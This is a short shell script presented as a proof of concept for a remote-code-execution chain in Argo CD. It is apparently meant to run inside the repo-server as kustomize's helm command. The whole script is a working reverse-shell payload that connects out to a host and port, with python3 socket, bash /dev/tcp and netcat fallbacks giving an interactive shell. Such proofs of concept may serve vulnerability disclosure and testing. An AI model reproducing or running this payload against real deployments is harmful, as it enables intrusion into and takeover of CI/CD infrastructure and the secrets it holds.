#!/bin/sh
# Argo CD Chain A PoC — reverse shell payload
# Called by kustomize as --helm-command with helm args (ignored)
HOST="192.168.1.34"
PORT=4444

# Fallback 1: python3 (present in repo-server image)
python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('$HOST',$PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
" 2>/dev/null && exit

# Fallback 2: bash /dev/tcp
bash -c "bash -i >& /dev/tcp/$HOST/$PORT 0>&1" 2>/dev/null && exit

# Fallback 3: busybox nc
nc $HOST $PORT -e /bin/sh 2>/dev/null && exit

echo "CHAIN_A_RCE_EXECUTED_NO_CALLBACK"
